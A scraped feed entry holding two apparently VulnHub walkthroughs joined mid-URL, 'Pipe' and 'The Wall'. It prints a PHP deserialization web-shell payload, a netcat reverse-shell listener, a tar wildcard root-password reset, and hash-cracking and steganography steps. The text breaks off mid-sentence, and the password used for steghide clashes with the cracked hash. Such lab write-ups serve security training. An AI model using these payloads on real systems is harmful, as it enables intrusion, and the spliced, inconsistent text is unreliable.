\n<h2 id=\"enumeration\">Enumeration</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">PORT      STATE SERVICE REASON  VERSION\n22/tcp    open  ssh     syn-ack OpenSSH 6.7p1 Debian 5 <span class=\"o\">(</span>protocol 2.0<span class=\"o\">)</span>\n| ssh-hostkey:\n|   1024 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f <span class=\"o\">(</span>DSA<span class=\"o\">)</span>\n|   2048 ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 <span class=\"o\">(</span>RSA<span class=\"o\">)</span>\n|_  256 d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 <span class=\"o\">(</span>ECDSA<span class=\"o\">)</span>\n80/tcp    open  http    syn-ack Apache httpd\n| http-auth:\n| HTTP/1.1 401 Unauthorized\n|_  Basic <span class=\"nv\">realm</span><span class=\"o\">=</span>index.php\n|_http-server-header: Apache\n|_http-title: 401 Unauthorized\n111/tcp   open  rpcbind syn-ack 2-4 <span class=\"o\">(</span>RPC <span class=\"c\">#100000)</span>\n| rpcinfo:\n|   program version   port/proto  service\n|   100000  2,3,4        111/tcp  rpcbind\n|   100000  2,3,4        111/udp  rpcbind\n|   100024  1          42192/udp  status\n|_  100024  1          47286/tcp  status\n47286/tcp open  status  syn-ack 1 <span class=\"o\">(</span>RPC <span class=\"c\">#100024)</span>\nMAC Address: 00:0C:29:05:96:3D <span class=\"o\">(</span>VMware<span class=\"o\">)</span>\nDevice <span class=\"nb\">type</span>: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.0\nUptime guess: 199.640 days <span class=\"o\">(</span>since Sat May  9 04:40:31 2015<span class=\"o\">)</span>\nNetwork Distance: 1 hop\nTCP Sequence Prediction: <span class=\"nv\">Difficulty</span><span class=\"o\">=</span>262 <span class=\"o\">(</span>Good luck!<span class=\"o\">)</span>\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux<span class=\"p\">;</span> CPE: cpe:/o:linux:linux_kernel</code></pre> \n</figure> \n<h3 id=\"service-enumeration\">Service Enumeration</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 22</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SSH</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>OpenSSH 6.7p1 Debian 5</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache HTTPD</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 111</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>rcpbind</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>n/a</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"http-enumeration\">HTTP Enumeration</h3> \n<p>Running OWASP dirbuster against port 80 exposed <code>/scriptz/</code> containing javascript and php files.</p> \n<p><img src=\"https://highon.coffee/img/blog/pipe/dirbuster.png\" alt=\"OWASP DirBuster\" /></p> \n<h2 id=\"source-code-interrogation\">Source Code Interrogation</h2> \n<h3 id=\"phpjs-interrogation\">php.js Interrogation</h3> \n<p><code>js.php</code> source revealed <strong>function serialize</strong></p> \n<p><strong>note:</strong> <em>the examples at the bottom.</em></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"k\">function </span>serialize<span class=\"o\">(</span>mixed_value<span class=\"o\">)</span> <span class=\"o\">{</span>\n//  discuss at: http://phpjs.org/functions/serialize/\n// original by: Arpad Ray <span class=\"o\">(</span>mailto:arpad@php.net<span class=\"o\">)</span>\n// improved by: Dino\n// improved by: Le Torbi <span class=\"o\">(</span>http://www.letorbi.de/<span class=\"o\">)</span>\n// improved by: Kevin van Zonneveld <span class=\"o\">(</span>http://kevin.vanzonneveld.net/<span class=\"o\">)</span>\n// bugfixed by: Andrej Pavlovic\n// bugfixed by: Garagoth\n// bugfixed by: Russell Walker <span class=\"o\">(</span>http://www.nbill.co.uk/<span class=\"o\">)</span>\n// bugfixed by: Jamie Beck <span class=\"o\">(</span>http://www.terabit.ca/<span class=\"o\">)</span>\n// bugfixed by: Kevin van Zonneveld\n//  <span class=\"o\">(</span>http://kevin.vanzonneveld.net/<span class=\"o\">)</span>\n// bugfixed by: Ben <span class=\"o\">(</span>http://benblume.co.uk/<span class=\"o\">)</span>\n//    input by: DtTvB  <span class=\"o\">(</span>http://dt.in.th/2008-09-16.string-length-in-bytes.h\n//    input by: Martin <span class=\"o\">(</span>http://www.erlenwiese.de/<span class=\"o\">)</span>\n//        note: We feel the main purpose of this <span class=\"k\">function </span>should be to ease the transport of data between php &amp; js\n//        note: Aiming <span class=\"k\">for </span>PHP-compatibility, we have to translate objects to arrays\n//   example 1: serialize<span class=\"o\">([</span><span class=\"s1\">'Kevin'</span>, <span class=\"s1\">'van'</span>, <span class=\"s1\">'Zonneveld'</span><span class=\"o\">])</span><span class=\"p\">;</span>\n//   returns 1:<span class=\"s1\">'a:3:{i:0;s:5:\"Kevin\";i:1;s:3:\"van\";i:2;s:9:\"Zonneveld\";}'</span>\n//   example 2: serialize<span class=\"o\">({</span>firstName:<span class=\"s1\">'Kevin'</span>, midName: <span class=\"s1\">'van'</span>, surName:<span class=\"s1\">'Zonneveld'</span><span class=\"o\">})</span><span class=\"p\">;</span>\n//   returns 2: <span class=\"s1\">'a:3:{s:9:\"firstName\";s:5:\"Kevin\";s:7:\"midName\";s:3:\"van\";s:7:\"surName\";s:9:\"Zonneveld\";}'</span></code></pre> \n</figure> \n<h3 id=\"logphpbak-interrogation\">log.php.BAK Interrogation</h3> \n<p>Inspection of the source revealed it works with the js file for serialization.</p> \n<p><img src=\"https://highon.coffee/img/blog/pipe/log.php.BAK.png\" alt=\"log.php.BAK Source Code Review\" /></p> \n<h2 id=\"burp-suite---post-request\">Burp Suite - POST Request</h2> \n<p>Modifying the request from GET to POST, renendered the index.php</p> \n<p><img src=\"https://highon.coffee/img/blog/pipe/burp-post.png\" alt=\"Burp POST instead of GET\" /></p> \n<p>Burp confirmed the Serialized object:</p> \n<p><img src=\"https://highon.coffee/img/blog/pipe/burp-serialized-object.png\" alt=\"Burp Serialized Object\" /></p> \n<h2 id=\"burp-decode-string\">Burp decode string</h2> \n<p><img src=\"https://highon.coffee/img/blog/pipe/burp-decode-string.png\" alt=\"Burp Decode String\" /></p> \n<p>Right click the string, send to Decoder.</p> \n<p><img src=\"https://highon.coffee/img/blog/pipe/burp-decoder-smart-decode.png\" alt=\"Burp Decoder Smart Decoder\" /></p> \n<p>Click “Smart decode”</p> \n<p>Using the example section of the previously discovered php.js file, it was possible to workout the serialization mechanism.</p> \n<p>New modified string introduced with burp:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-js\" data-lang=\"js\"><span class=\"nx\">O</span><span class=\"p\">:</span><span class=\"mi\">3</span><span class=\"p\">:</span><span class=\"dl\">\"</span><span class=\"s2\">Log</span><span class=\"dl\">\"</span><span class=\"p\">:</span><span class=\"mi\">2</span><span class=\"p\">:{</span><span class=\"nl\">s</span><span class=\"p\">:</span><span class=\"mi\">8</span><span class=\"p\">:</span><span class=\"dl\">\"</span><span class=\"s2\">filename</span><span class=\"dl\">\"</span><span class=\"p\">;</span><span class=\"nl\">s</span><span class=\"p\">:</span><span class=\"mi\">30</span><span class=\"p\">:</span><span class=\"dl\">\"</span><span class=\"s2\">/var/www/html/scriptz/Meh1.txt</span><span class=\"dl\">\"</span><span class=\"p\">;</span><span class=\"nl\">s</span><span class=\"p\">:</span><span class=\"mi\">4</span><span class=\"p\">:</span><span class=\"dl\">\"</span><span class=\"s2\">data</span><span class=\"dl\">\"</span><span class=\"p\">;</span><span class=\"nl\">s</span><span class=\"p\">:</span><span class=\"mi\">12</span><span class=\"p\">:</span><span class=\"dl\">\"</span><span class=\"s2\">HighOnCoffee</span><span class=\"dl\">\"</span>\n<span class=\"p\">;}</span></code></pre> \n</figure> \n<p>Using Burp Decoder URL Encode the above string and using Burp Repeater to inject.</p> \n<p><img src=\"https://highon.coffee/img/blog/pipe/burp-repeater.png\" alt=\"Burp Repeater\" /></p> \n<p>Refreshing the scriptz directory confirmed the creation of Meh.txt containing the text <code>HighOnCoffee</code>.</p> \n<h2 id=\"injecting-reverse-shell-code\">Injecting Reverse Shell Code</h2> \n<p>Burp Decoder was leveraged to encode the following string:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-js\" data-lang=\"js\"><span class=\"nx\">O</span><span class=\"p\">:</span><span class=\"mi\">3</span><span class=\"p\">:</span><span class=\"dl\">\"</span><span class=\"s2\">Log</span><span class=\"dl\">\"</span><span class=\"p\">:</span><span class=\"mi\">2</span><span class=\"p\">:{</span><span class=\"nl\">s</span><span class=\"p\">:</span><span class=\"mi\">8</span><span class=\"p\">:</span><span class=\"dl\">\"</span><span class=\"s2\">filename</span><span class=\"dl\">\"</span><span class=\"p\">;</span><span class=\"nl\">s</span><span class=\"p\">:</span><span class=\"mi\">31</span><span class=\"p\">:</span><span class=\"dl\">\"</span><span class=\"s2\">/var/www/html/scriptz/shell.php</span><span class=\"dl\">\"</span><span class=\"p\">;</span><span class=\"nl\">s</span><span class=\"p\">:</span><span class=\"mi\">4</span><span class=\"p\">:</span><span class=\"dl\">\"</span><span class=\"s2\">data</span><span class=\"dl\">\"</span><span class=\"p\">;</span><span class=\"nl\">s</span><span class=\"p\">:</span><span class=\"mi\">60</span><span class=\"p\">:</span><span class=\"dl\">\"</span><span class=\"s2\">\n&lt;?php echo '&lt;pre&gt;'; system($_GET['cmd']); echo '&lt;/pre&gt;'; ?&gt;</span><span class=\"dl\">\"</span><span class=\"p\">;}</span></code></pre> \n</figure> \n<p>Select Encode as URL.</p> \n<p>Paste encoded string into Burp Repeater:</p> \n<p><img src=\"https://highon.coffee/img/blog/pipe/burp-repeater-shell.png\" alt=\"Burp Repeater PHP Shell Upload\" /></p> \n<h2 id=\"php-shell\">PHP Shell</h2> \n<p><img src=\"https://highon.coffee/img/blog/pipe/php-shell-rce.png\" alt=\"PHP Shell RCE\" />’</p> \n<h2 id=\"reverse-shell\">Reverse Shell</h2> \n<p>nc is installed on the target, the php shell introduced at the previous step is leveraged to execute a netcat reverse shell.</p> \n<p><img src=\"https://highon.coffee/img/blog/pipe/rev-shell-exec.png\" alt=\"Execute Netcat\" /></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-js\" data-lang=\"js\"><span class=\"p\">[</span><span class=\"nx\">root</span><span class=\"p\">:</span><span class=\"o\">~</span><span class=\"p\">]</span><span class=\"err\">#</span> <span class=\"nx\">nc</span> <span class=\"o\">-</span><span class=\"nx\">v</span> <span class=\"o\">-</span><span class=\"nx\">n</span> <span class=\"o\">-</span><span class=\"nx\">l</span> <span class=\"o\">-</span><span class=\"nx\">p</span> <span class=\"mi\">443</span>\n<span class=\"nx\">listening</span> <span class=\"nx\">on</span> <span class=\"p\">[</span><span class=\"nx\">any</span><span class=\"p\">]</span> <span class=\"mi\">443</span> <span class=\"p\">...</span>\n<span class=\"nx\">connect</span> <span class=\"nx\">to</span> <span class=\"p\">[</span><span class=\"mf\">192.168</span><span class=\"p\">.</span><span class=\"mf\">30.134</span><span class=\"p\">]</span> <span class=\"k\">from</span> <span class=\"p\">(</span><span class=\"nx\">UNKNOWN</span><span class=\"p\">)</span> <span class=\"p\">[</span><span class=\"mf\">192.168</span><span class=\"p\">.</span><span class=\"mf\">30.142</span><span class=\"p\">]</span> <span class=\"mi\">37957</span>\n<span class=\"nx\">id</span>\n<span class=\"nx\">uid</span><span class=\"o\">=</span><span class=\"mi\">33</span><span class=\"p\">(</span><span class=\"nx\">www</span><span class=\"o\">-</span><span class=\"nx\">data</span><span class=\"p\">)</span> <span class=\"nx\">gid</span><span class=\"o\">=</span><span class=\"mi\">33</span><span class=\"p\">(</span><span class=\"nx\">www</span><span class=\"o\">-</span><span class=\"nx\">data</span><span class=\"p\">)</span> <span class=\"nx\">groups</span><span class=\"o\">=</span><span class=\"mi\">33</span><span class=\"p\">(</span><span class=\"nx\">www</span><span class=\"o\">-</span><span class=\"nx\">data</span><span class=\"p\">)</span>\n<span class=\"nx\">whoami</span>\n<span class=\"nx\">www</span><span class=\"o\">-</span><span class=\"nx\">data</span></code></pre> \n</figure> \n<h2 id=\"linux-local-privilege-escalation\">Linux Local Privilege Escalation</h2> \n<p>Spawn tty:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">python <span class=\"nt\">-c</span> <span class=\"s1\">'import pty;pty.spawn(\"/bin/bash\")'</span></code></pre> \n</figure> \n<p>Get HighOn.Coffee linux local enumeration script:</p> \n<p><code>wget https://highon.coffee/downloads/linux-local-enum.sh</code></p> \n<p><img src=\"https://highon.coffee/img/blog/pipe/enum-rene-home.png\" alt=\"HighOn.Coffee script enum\" /></p> \n<p>Inspection of <code>/etc/crontab</code> exposed the script <code>/usr/bin/compress.sh</code> which is world readable.</p> \n<p><img src=\"https://highon.coffee/img/blog/pipe/crontab.png\" alt=\"crontab\" /></p> \n<h2 id=\"tar--unix-wildcards-local-privilege-escalation\">Tar Unix Wildcards Local Privilege Escalation</h2> \n<h3 id=\"unix-wildcards\">Unix Wildcards</h3> \n<p>The previously discovered backup script uses * to perform a backup of all files within the directory <code>/home/rene/backup/</code>. Due to poorly configured file system permission on the backup directory, it’s possible to introduce files in the backup directory which tar will process when it backs up the files in the directory.</p> \n<h3 id=\"tar-arbitrary-command-execution\">Tar Arbitrary Command Execution</h3> \n<p>Tar’s <code>--checkpoint-action</code> parameter can be abused to execute arbitrary code as the user executing the tar binary. <code>--checkpoint-action</code> exists as a tar feature allowing binary execution of a command when the file prefixed with <code>--checkpoint-action=exec=COMMAND-HERE</code> is reached.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">www-data@pipe:/home/rene/backup<span class=\"nv\">$ </span><span class=\"nb\">echo</span> <span class=\"o\">&gt;</span> <span class=\"nt\">--checkpoint-action</span><span class=\"o\">=</span><span class=\"nb\">exec</span><span class=\"o\">=</span>sh<span class=\"se\">\\ </span>passwd.sh<span class=\"p\">;</span>\n&lt;ckup<span class=\"nv\">$ </span><span class=\"nb\">echo</span> <span class=\"o\">&gt;</span> <span class=\"nt\">--checkpoint-action</span><span class=\"o\">=</span><span class=\"nb\">exec</span><span class=\"o\">=</span>sh<span class=\"se\">\\ </span>passwd.sh<span class=\"p\">;</span>                        \nwww-data@pipe:/home/rene/backup<span class=\"nv\">$ </span><span class=\"nb\">echo</span> <span class=\"o\">&gt;</span> <span class=\"nt\">--checkpoint</span><span class=\"o\">=</span>1<span class=\"p\">;</span>\n<span class=\"nb\">echo</span> <span class=\"o\">&gt;</span> <span class=\"nt\">--checkpoint</span><span class=\"o\">=</span>1<span class=\"p\">;</span></code></pre> \n</figure> \n<p>The above leverages the tar arbitrary command execution, reseting the root account password when the cronjob is processed (every 5 minutes).</p> \n<h2 id=\"root-flag\">Root Flag</h2> \n<p>After 5 minutes, escalate root privileges by executing <code>su -</code> and entering the password <code>passwd</code>.</p> \n<p><img src=\"https://highon.coffee/img/blog/pipe/pipe-root-flag.png\" alt=\"Pipe Root Flag VulnHub\" /></p> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Thu, 26 Nov 2015 01:05:10 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/pipe/dirbuster.png","linkMd5":"f0ddd92a2b4d398dc69b548032e5e1ee","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn91@2020_4/2020/08/25/01-24-54-437_0a5c1ce69a2d392c.webp","destWidth":768,"destHeight":541,"sourceBytes":28218,"destBytes":32110,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/pipe/dirbuster.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn91@2020_4/2020/08/25/01-24-54-437_0a5c1ce69a2d392c.webp","https://highon.coffee/img/blog/pipe/log.php.BAK.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn20@2020_5/2020/08/25/01-25-14-400_8f498532a462ad9d.webp","https://highon.coffee/img/blog/pipe/burp-post.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn96@2020_1/2020/08/25/01-25-14-389_d1b5e531d09ad190.webp","https://highon.coffee/img/blog/pipe/burp-serialized-object.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn8@2020_6/2020/08/25/01-25-14-587_58e08018f0f15a8b.webp","https://highon.coffee/img/blog/pipe/burp-decode-string.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn44@2020_6/2020/08/25/01-25-14-599_20993c99cd71e0a4.webp","https://highon.coffee/img/blog/pipe/burp-decoder-smart-decode.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn100@2020_1/2020/08/25/01-25-14-398_dd28fe2f1417c17a.webp","https://highon.coffee/img/blog/pipe/burp-repeater.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn16@2020_1/2020/08/25/01-25-16-745_f78d304fc76c8c9e.webp","https://highon.coffee/img/blog/pipe/burp-repeater-shell.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn87@2020_3/2020/08/25/01-25-14-557_647554d3cea0deee.webp","https://highon.coffee/img/blog/pipe/php-shell-rce.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn71@2020_3/2020/08/25/01-25-14-532_f886fdfd875f8481.webp","https://highon.coffee/img/blog/pipe/rev-shell-exec.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn8@2020_2/2020/08/25/01-25-15-685_63b2ce75e56dadf8.webp","https://highon.coffee/img/blog/pipe/enum-rene-home.png":"h id=\"markdown-toc-root-flag\">Root Flag</a></li> \n</ul> \n<h2 id=\"author-description\">Author Description</h2> \n<p>In 1965, one of the most influential bands of our times was formed.. Pink Floyd. This boot2root box has been created to celebrate 50 years of Pink Floyd’s contribution to the music industry, with each challenge giving the attacker an introduction to each member of the Floyd.</p> \n<p><strong>Author:</strong> <a href=\"https://twitter.com/xerubus\">@xerubus</a></p> \n<p><strong>Download:</strong> <a href=\"https://www.vulnhub.com\">VulnHub</a></p> \n<h2 id=\"enumeration\">Enumeration</h2> \n<p>An initial Nmap scan yielded no results.</p> \n<p>WireShark was used to expose an ARP broadcast for <code>TCP: 1337</code>, a netcat listener was setup on port 1337.</p> \n<p>The target machine connected with the following message:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">netcat <span class=\"nt\">-n</span> <span class=\"nt\">-v</span> <span class=\"nt\">-l</span> <span class=\"nt\">-p</span>\n\n                      .u!<span class=\"s2\">\"</span><span class=\"sb\">`</span>\n                  .x<span class=\"k\">*</span><span class=\"s2\">\"</span><span class=\"sb\">`</span>\n              ..+<span class=\"s2\">\"NP\n           .z\"\"   ?\n         M#</span><span class=\"sb\">`</span>      9     ,     ,\n                  9 M  d! ,8P<span class=\"s1\">'\n                  R X.:x'</span> R<span class=\"s1\">'  ,\n                  F F'</span> M  R.d<span class=\"s1\">'\n                  d P  @  E`  ,\n     ss           P  '</span>  P  N.d<span class=\"s1\">'\n      x         ''        '</span>\n      X               x             <span class=\"nb\">.</span>\n      9     .f       <span class=\"o\">!</span>         <span class=\"nb\">.</span>    <span class=\"nv\">$b</span>\n      4<span class=\"p\">;</span>    <span class=\"nv\">$k</span>      /         dH    <span class=\"nv\">$f</span>\n     <span class=\"s1\">'X   ;$$     z  .       MR   :$\n       R   M$$,   :  d9b      M'</span>   tM\n       M:  <span class=\"c\">#'$L  ;' M `8      X    MR</span>\n       <span class=\"sb\">`</span><span class=\"nv\">$;</span><span class=\"s2\">t' </span><span class=\"nv\">$F</span><span class=\"s2\">  # X ,oR      t    Q;\n        </span><span class=\"nv\">$$</span><span class=\"s2\">@  R</span><span class=\"nv\">$ </span><span class=\"s2\">H :RP' </span><span class=\"nv\">$b</span><span class=\"s2\">     X    @'\n        9</span><span class=\"nv\">$E</span><span class=\"s2\">  @Bd' </span><span class=\"nv\">$'</span><span class=\"s2\">   ?X     ;    W\n        </span><span class=\"sb\">`</span>M<span class=\"s1\">'  `$M d$    `E    ;.o* :R   ..\n         `    '</span>  <span class=\"s2\">\"'     '    @'   '</span><span class=\"nv\">$o</span><span class=\"s2\">*\"</span><span class=\"s1\">'\n\n             The Wall by @xerubus\n         -= Welcome to the Machine =-\n\nIf you should go skating on the thin ice of modern life, dragging behind you the silent reproach of a million tear-stained eyes, don'</span>t be surprised when a crack <span class=\"k\">in </span>the ice appears under your feet. - Pink Floyd, The Thin Ice</code></pre> \n</figure> \n<h3 id=\"port-scanning\">Port Scanning</h3> \n<p>After the machine successfully connected to the netcat listener the following services were discovered with Nmap.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\"># nmap -sV -p 1-65535 -A -v 192.168.221.129</span>\n\nStarting Nmap 7.00 <span class=\"se\">\\x</span>20Sans<span class=\"se\">\\x</span>20MS<span class=\"s1\">',\\x20\nSF:'</span>Chalkboard<span class=\"se\">\\x</span>20SE<span class=\"s1\">',\\x20'</span>Comic<span class=\"se\">\\x</span>20Neue<span class=\"s1\">',\\x20sans-serif;\\x20}\\nhr\\x20{\\x2\nSF:0border:\\x200;\\x20border-bottom:\\x201px\\x20dashed;\\x20}\\n\\n--&gt;&lt;/style&gt;\\\nSF:n&lt;/head&gt;\\n&lt;body&gt;\\n&lt;h1&gt;405\\x20Method\\x20Not\\x20Allowed&lt;/h1&gt;\\n&lt;hr&gt;\\n&lt;addr\nSF:ess&gt;OpenBSD\\x20httpd&lt;/address&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(RTSPRequest,218,\nSF:\"HTTP/1\\.0\\x20405\\x20Method\\x20Not\\x20Allowed\\r\\nDate:\\x20Sun,\\x2029\\x2\nSF:0Nov\\x202015\\x2022:51:15\\x20GMT\\r\\nServer:\\x20OpenBSD\\x20httpd\\r\\nConne\nSF:ction:\\x20close\\r\\nContent-Type:\\x20text/html\\r\\nContent-Length:\\x20376\nSF:\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html&gt;\\n&lt;head&gt;\\n&lt;title&gt;405\\x20Method\\x20Not\nSF:\\x20Allowed&lt;/title&gt;\\n&lt;style\\x20type=\\\"text/css\\\"&gt;&lt;!--\\nbody\\x20{\\x20bac\nSF:kground-color:\\x20white;\\x20color:\\x20black;\\x20font-family:\\x20'</span>Comic<span class=\"se\">\\</span>\nSF:x20Sans<span class=\"se\">\\x</span>20MS<span class=\"s1\">',\\x20'</span>Chalkboard<span class=\"se\">\\x</span>20SE<span class=\"s1\">',\\x20'</span>Comic<span class=\"se\">\\x</span>20Neue<span class=\"s1\">',\\x20sans-seri\nSF:f;\\x20}\\nhr\\x20{\\x20border:\\x200;\\x20border-bottom:\\x201px\\x20dashed;\\x\nSF:20}\\n\\n--&gt;&lt;/style&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n&lt;h1&gt;405\\x20Method\\x20Not\\x20Allowe\nSF:d&lt;/h1&gt;\\n&lt;hr&gt;\\n&lt;address&gt;OpenBSD\\x20httpd&lt;/address&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n\");\nMAC Address: 00:0C:29:31:3C:84 (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: OpenBSD 5.X\nOS CPE: cpe:/o:openbsd:openbsd:5\nOS details: OpenBSD 5.0 - 5.4\nUptime guess: 0.000 days (since Mon Nov 30 06:32:25 2015)\nNetwork Distance: 1 hop\nTCP Sequence Prediction: Difficulty=258 (Good luck!)\nIP ID Sequence Generation: Randomized\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.27 ms 192.168.221.129\n\nNSE: Script Post-scanning.\nInitiating NSE at 06:32\nCompleted NSE at 06:32, 0.00s elapsed\nInitiating NSE at 06:32\nCompleted NSE at 06:32, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 210.78 seconds\n           Raw packets sent: 131193 (5.775MB) | Rcvd: 91 (4.108KB)</span></code></pre> \n</figure> \n<h3 id=\"service-enumeration\">Service Enumeration</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>OpenBSD httpd</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 1965</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SSH</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>OpenSSH 7.0 (protocol 2.0)</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"http-enumeration\">HTTP Enumeration</h3> \n<p>Interrogation of the page source revealed a code comment with an <strong>ASCII</strong> encoded string:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-html\" data-lang=\"html\"><span class=\"c\">&lt;!--If you want to find out what's behind these cold eyes, you'll just have to claw your way through this disguise. - Pink Floyd, The Wall\n\nDid you know? The Publius Enigma is a mystery surrounding the Division Bell album.  Publius promised an unspecified reward for solving the\nriddle, and further claimed that there was an enigma hidden within the artwork.\n\n737465673d3333313135373330646262623337306663626539373230666536333265633035--&gt;</span></code></pre> \n</figure> \n<p>Decoding revealed the MD5 hash:<code>steg=33115730dbbb370fcbe9720fe632ec05</code></p> \n<h2 id=\"hash-cracking\">Hash Cracking</h2> \n<h3 id=\"md5-hashcat\">MD5 Hashcat</h3> \n<p>The discovered hash was cracked with <strong>Hashcat</strong>:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">hashcat <span class=\"nt\">-m</span> 0 <span class=\"nt\">-a</span> 0 thewall.txt /usr/share/wordlists/rockyou.txt</code></pre> \n</figure> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Hash</th> \n    <th>Password</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>33115730dbbb370fcbe9720fe632ec05</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>pinkfloydrocks</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"steghide\">Steghide</h2> \n<p>Install steghide on kali: <code>apt-get install -y steghide</code></p> \n<p>The steghide command <code>steghide extract -sf pink_floyd.jpg</code> was used to extract data from images with hidden information retained within them (steganography). Entering the previously cracked password <code>divisionbell</code> disclosed another message containing a <strong>base64</strong> encoded string and another <strong>md5</strong> hash.</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Username</th> \n    <th>Password</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>SydBarrett</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>divisionbell</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"sftp-login\">SFTP Login</h2> \n<p>The discovered account credentials above allowed access to an SFTP server on the target machine.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">sftp&gt; <span class=\"nb\">cd</span> .mail/.stash/\nsftp&gt; <span class=\"nb\">ls\n</span>eclipsed_by_the_moon\nsftp&gt; get eclipsed_by_the_moon</code></pre> \n</figure> \n<p>The file <code>eclipsed_by_the_moon</code> was downloaded for further investigation.</p> \n<h2 id=\"fatcat-fat16-forensics-tool\">Fatcat FAT16 Forensics Tool</h2> \n<p>The <code>file</code> command was leveraged to disclose the following information about the previously retrived file <code>ecslipsed_by_the_moon</code>.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">eclipsed_by_the_moon.lsd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID\n<span class=\"s2\">\"MSDOS5.0\"</span>, sectors/cluster 2, reserved sectors 8, root entries 512, Media\ndescriptor 0xf8, sectors/FAT 188, sectors/track 63, heads 255, hidden sectors\n2048, sectors 96256 <span class=\"o\">(</span>volumes <span class=\"o\">&gt;</span> 32 MB<span class=\"o\">)</span> , serial number 0x9e322180, unlabeled,\nFAT <span class=\"o\">(</span>16 bit<span class=\"o\">)</span></code></pre> \n</figure> \n<p>Research discovered <strong>Fatcat</strong> a forensics tool used for recovering / extracting data from FAT16 images.</p> \n<p>The following command was used to extract a deleted image file from the FAT16 disk image:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">fatcat ~/Desktop/eclipsed_by_the_moon.lsd <span class=\"nt\">-r</span> /rogerwaters.jpg <span class=\"o\">&gt;</span> rogerwaters.jpg</code></pre> \n</figure> \n<p>Viewing the image disclosed the 